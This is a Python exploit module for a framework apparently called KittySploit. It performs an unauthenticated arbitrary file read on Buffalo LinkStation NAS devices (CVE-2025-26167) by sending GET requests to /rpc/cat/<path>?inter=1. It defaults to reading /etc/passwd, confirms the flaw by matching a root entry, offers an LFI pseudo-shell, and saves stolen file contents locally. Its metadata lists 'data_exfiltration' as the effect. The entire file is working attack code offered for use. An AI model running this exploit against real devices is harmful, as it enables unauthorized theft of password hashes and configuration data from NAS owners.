#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Buffalo LinkStation unauthenticated arbitrary file read via /rpc/cat/ (CVE-2025-26167)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.lfi import Lfi


class Module(Auxiliary, Http_client, Lfi):
    __info__ = {
        'name': 'Buffalo LinkStation - Arbitrary File Read (CVE-2025-26167)',
        'description': (
            'Buffalo LinkStation exposes /rpc/cat/<path>?inter=1 without authentication, '
            'allowing unauthenticated arbitrary file reads (password hashes, configs, etc.).'
        ),
        'author': ['SpikeReply', 'KittySploit Team'],
        'cve': ['CVE-2025-26167'],
        'platform': Platform.LINUX,
        'references': [
            'https://github.com/SpikeReply/advisories/blob/0f15f5aefb959fbaff049da7cc3e36733e25b580/cve/buffalo/cve-2025-26167.md',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-26167',
        ],
        'tags': ['buffalo', 'linkstation', 'nas', 'lfi', 'file-read', 'unauth', 'cve-2025-26167'],
        'agent': {
            'risk': 'intrusive',
            'effects': ['data_exfiltration'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': True,
            'produces': ['risk_signals'],
            'cost': 1.2,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['scanner/http/cve_2025_26167_detect'],
            },
        },
    }
    file_read = OptString('/etc/passwd', 'Absolute remote file path to read', required=True)
    output_file = OptString('', 'Local file to write retrieved content', required=False)
    output_limit = OptInteger(12000, 'Max chars to print when output_file empty (0=full)', required=False, advanced=True)

    def execute(self, file_path: str) -> str:
        remote = str(file_path or '').strip().lstrip('/')
        if not remote:
            return ''
        path = f'/rpc/cat/{remote}?inter=1'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return ''
        return r.text or ''

    def check(self):
        body = self.execute('/etc/passwd')
        if re.search(r'root:.*:0:0:', body or ''):
            return {
                'vulnerable': True,
                'reason': 'CVE-2025-26167 confirmed: /etc/passwd readable',
                'confidence': 'high',
            }
        return {
            'vulnerable': False,
            'reason': 'Could not read /etc/passwd via /rpc/cat/',
            'confidence': 'medium',
        }

    def run(self):
        if self.shell_lfi:
            print_status('LFI pseudo-shell via /rpc/cat/')
            self.handler_lfi()
            return True

        remote = str(self.file_read or '').strip()
        if not remote:
            print_error('file_read is required')
            return False

        data = self.execute(remote)
        if not data:
            print_error('File read failed or empty response')
            return False

        print_success(f'Read {len(data)} bytes from {remote}')
        local = str(self.output_file or '').strip()
        if local:
            try:
                with open(local, 'w', encoding='utf-8', errors='ignore') as fh:
                    fh.write(data)
                print_success(f'Wrote content to {local}')
            except OSError as e:
                print_error(f'Could not write output_file: {e}')
                return False
        else:
            limit = int(self.output_limit or 0)
            print_info(data if not limit or len(data) <= limit else data[:limit] + '\n... [truncated]')
        return True
